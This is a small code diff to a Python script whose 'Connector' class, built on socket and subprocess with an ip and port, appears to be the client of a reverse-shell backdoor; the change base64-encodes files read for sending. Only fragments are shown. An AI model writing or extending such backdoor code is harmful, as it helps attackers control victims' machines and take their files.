@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json, sys, os
+import socket, subprocess, json, sys, os, base64
 
 class Connector:
     def __init__(self, ip, port):
@@ -25,7 +25,7 @@ class Connector:
 
     def read_file(self, path):
         with open(path, "rb") as file:
-            return file.read()
+            return base64.b64encode(file.read())
 
     def run(self):
         while True:
